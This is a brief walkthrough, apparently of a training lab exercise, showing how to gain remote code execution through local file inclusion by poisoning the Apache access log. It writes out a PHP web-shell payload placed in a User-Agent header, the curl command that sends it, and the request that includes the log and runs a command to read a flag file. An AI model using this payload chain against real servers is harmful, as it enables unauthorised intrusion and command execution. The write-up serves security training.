##  Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
- http://154.57.164.78:32001/index.php?language=/var/log/apache2/access.log
<img width="710" height="532" alt="obraz" src="https://github.com/user-attachments/assets/66a5f916-81a0-40f5-bf8f-6f76f581d110" />
<b>echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison</b>
- <b>curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison</b>
<img width="1192" height="233" alt="obraz" src="https://github.com/user-attachments/assets/22d08057-daa3-4dcc-8729-92a1f7146906" />
- <b>GET /index.php?language=/var/log/apache2/access.log&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt</b>
<img width="1192" height="298" alt="obraz" src="https://github.com/user-attachments/assets/e1a02d4e-1a9f-4b1f-8f6f-7bccaca34967" />

